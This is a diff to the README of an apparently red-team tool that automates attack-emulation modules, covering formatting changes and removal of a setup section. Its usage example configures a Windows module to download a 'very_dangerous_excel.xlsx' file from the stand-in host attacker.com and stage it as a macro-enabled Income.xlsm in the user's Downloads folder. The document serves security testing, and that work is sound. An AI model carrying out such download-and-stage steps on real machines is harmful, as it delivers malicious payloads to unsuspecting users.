@@ -24,7 +24,7 @@ This project is aimed to help red team construct fully customizable and automate
 
 Make sure `python 3.11+` and `poetry` are installed:
 
-- **Python** - https://www.python.org/downloads/
+- **Python 3.11+** - https://www.python.org/downloads/
 - **Poetry** - https://python-poetry.org/docs/#installation
 
 ```bash
@@ -42,6 +42,7 @@ python main.py
 
 # Run desired execution module by id
 python main.py <module_id>
+
 # Ex:
 python main.py 62385f03a0e69ed2274622cc
 ```
@@ -72,31 +73,18 @@ from core.module.windows import WindowsModule
 
 # Create a windows module instance
 execution = WindowsModule("62385f03a0e69ed2274622cc", debug=True)
+
 # Update the input arguments to your own ones
 execution.input_arguments.update({
     "download_file_url": "https://attacker.com/very_dangerous_excel.xlsx",
     "download_file_path": "$env:userprofile\Downloads\Income.xlsm",
 })
+
 # Execute the module after initialization
 execution.run()
 ```
 
 ## Development
-
-### Environment
-
-- Python 3.11+
-- Poetry
-
-### Setup
-
-```powershell
-# Install dependencies
-poetry install
-
-# Activate the virtual environment
-poetry shell
-```
 
 ### Blueprint
 
